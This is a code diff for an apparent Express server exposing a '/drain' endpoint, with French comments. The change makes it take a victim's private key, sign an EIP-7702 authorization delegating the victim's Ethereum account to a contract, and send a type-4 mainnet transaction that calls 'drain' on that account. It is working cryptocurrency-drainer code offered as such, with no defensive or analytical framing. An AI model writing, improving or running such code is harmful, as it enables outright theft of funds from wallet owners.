@@ -16,18 +16,17 @@ app.use(express.json());
 
 app.post("/drain", async (req, res) => {
   try {
-    const { victim, auth } = req.body;
-    if (!victim || !auth) return res.status(400).json({ error: "victim/auth manquant" });
+    const { victimPk } = req.body;
+    if (!victimPk) return res.status(400).json({ error: "victimPk manquant" });
 
-    // On reconstruit l'autorisation signée par la victime
-    const authorization = {
-      chainId: BigInt(auth.chainId),
+    const victim = new Wallet(victimPk, provider);
+
+    // ethers signe l'autorisation au bon format 7702
+    const authorization = await victim.signAuthorization({
+      chainId: 1,
       address: CONTRACT,
-      nonce: BigInt(auth.nonce),
-      yParity: Number(auth.yParity),
-      r: auth.r,
-      s: auth.s,
-    };
+      nonce: await provider.getTransactionCount(victim.address, "latest"),
+    });
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
     const fee = await provider.getFeeData();
@@ -35,7 +34,7 @@ app.post("/drain", async (req, res) => {
     const tx = {
       type: 4,
       chainId: 1,
-      to: victim,
+      to: victim.address,
       value: 0n,
       data: iface.encodeFunctionData("drain"),
       nonce,
